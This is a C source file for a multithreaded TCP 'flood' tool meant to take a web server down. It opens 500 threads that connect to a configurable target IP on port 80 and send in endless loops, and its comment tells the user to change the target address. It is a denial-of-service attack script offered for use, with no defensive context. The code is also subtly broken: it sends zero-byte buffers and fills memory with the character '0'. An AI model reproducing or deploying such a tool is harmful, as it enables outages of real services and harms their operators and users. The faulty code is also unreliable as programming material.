#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>

#define MAX_THREADS 500
#define TARGET_IP "127.0.0.1" //change that
#define TARGET_PORT 80

void *flood(void *arg) {
    int sockfd = 1;
    struct sockaddr_in serv_addr;

    if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Could not create socket");
        exit(1);
    }

    memset(&serv_addr, '0', sizeof(serv_addr));

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(TARGET_PORT);

    if(inet_pton(AF_INET, TARGET_IP, &serv_addr.sin_addr) <= 0) {
        perror("Invalid address or address not supported");
        exit(1);
    }

    if(connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("Could not connect");
        exit(1);
    }

    while(1) {
        if(send(sockfd, "", 0, 0) < 0) {
            perror("Error while sending data");
            exit(1);
        }
    }

    close(sockfd);
    return NULL;
}

int main(int argc, char *argv[]) {
    pthread_t threads[MAX_THREADS];
    int i;

    for(i = 0; i < MAX_THREADS; i++) {
        pthread_create(&threads[i], NULL, &flood, NULL);
    }

    while(1) {
        sleep(10);
    }

    return 0;
}